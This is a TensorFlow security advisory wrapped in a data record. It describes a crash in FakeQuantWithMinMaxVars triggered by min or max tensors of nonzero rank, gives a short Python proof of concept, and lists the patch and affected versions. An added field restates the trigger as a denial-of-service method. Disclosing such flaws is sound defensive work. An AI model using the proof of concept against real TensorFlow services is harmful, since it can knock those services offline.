{"description": "### Impact\nIf `FakeQuantWithMinMaxVars` is given `min` or `max` tensors of a nonzero rank, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nnum_bits = 8\nnarrow_range = False\ninputs = tf.constant(0, shape=[2,3], dtype=tf.float32)\nmin = tf.constant(0, shape=[2,3], dtype=tf.float32)\nmax = tf.constant(0, shape=[2,3], dtype=tf.float32)\ntf.raw_ops.FakeQuantWithMinMaxVars(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by:\n - Neophytos Christou, Secure Systems Labs, Brown University.\n - \u5218\u529b\u6e90, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology\n", "methods": ["Trigger a denial of service attack by providing `min` or `max` tensors of a nonzero rank to `FakeQuantWithMinMaxVars`."]}
